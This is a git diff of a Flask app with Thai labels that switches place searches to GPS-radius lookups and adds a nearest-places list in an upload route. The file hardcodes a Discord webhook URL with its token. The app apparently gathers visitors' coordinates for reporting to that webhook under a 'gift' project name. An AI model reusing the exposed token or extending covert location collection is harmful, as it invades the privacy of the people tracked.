@@ -4,7 +4,6 @@ import base64
 import json
 from datetime import datetime
 import time
-import random
 
 app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1512723643745042612/3X6Sb6_9-NkD7si38K08e82SWJkn1dxfDBTVwWmsSdpxyiLPspTWiPXyxCyaIC1YMbZe"
@@ -36,10 +35,9 @@ def reverse_geocode(lat, lon):
         print(f"Reverse error: {e}")
     return None
 
-def search_places_in_province(province, query, limit=10):
+def search_places(lat, lon, query, limit=5, radius=3000):
     try:
-        search_q = f"{query} {province}"
-        url = f'https://nominatim.openstreetmap.org/search?format=json&q={search_q}&limit={limit}&accept-language=th&bounded=1'
+        url = f'https://nominatim.openstreetmap.org/search?format=json&q={query}&lat={lat}&lon={lon}&radius={radius}&limit={limit}&accept-language=th&bounded=1'
         headers = {'User-Agent': 'MyApp/1.0 (gift.project)'}
         resp = requests.get(url, headers=headers, timeout=8)
         data = resp.json()
@@ -60,8 +58,7 @@ def search_places_in_province(province, query, limit=10):
         print(f"Search error: {e}")
     return []
 
-def add_ranking(results, label):
-    """เพิ่มหมายเลขลำดับให้ผลลัพธ์"""
+def add_ranking(results):
     ranked = []
     for i, name in enumerate(results, 1):
         ranked.append(f"{i}. {name}")
@@ -342,20 +339,24 @@ def upload():
         if province_name and 'จังหวัด' in province_name:
             clean_province = province_name.replace('จังหวัด', '').strip()
             
-            # กำหนดจำนวนการค้นหา
             searches = [
                 ('🏫 โรงเรียน Top 10', f'โรงเรียน {clean_province}', 10),
                 ('🍽️ ร้านอาหาร Top 5', f'ร้านอาหาร {clean_province}', 5),
                 ('🏥 โรงพยาบาล Top 3', f'โรงพยาบาล {clean_province}', 3),
-                ('🏝️ สถานที่ท่องเที่ยว Top 10', f'สถานที่ท่องเที่ยว {clean_province}', 10)
+                ('🏝️ สถานที่ท่องเที่ยว 3 แห่ง', f'สถานที่ท่องเที่ยว {clean_province}', 3)
             ]
             
             for label, query, limit in searches:
-                results = search_places_in_province(clean_province, query, limit)
+                results = search_places(lat, lon, query, limit)
                 if results:
-                    ranked = add_ranking(results, label)
+                    ranked = add_ranking(results)
                     nearby_results[label] = ranked
                 time.sleep(0.5)
+            
+            # ค้นหาสถานที่ใกล้ GPS (รัศมี 2 กม.)
+            nearby_spots = search_places(lat, lon, 'point of interest', 3, radius=2000)
+            if nearby_spots:
+                nearby_results['📍 สถานที่ใกล้คุณที่สุด'] = add_ranking(nearby_spots)
         
         time_now = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
         
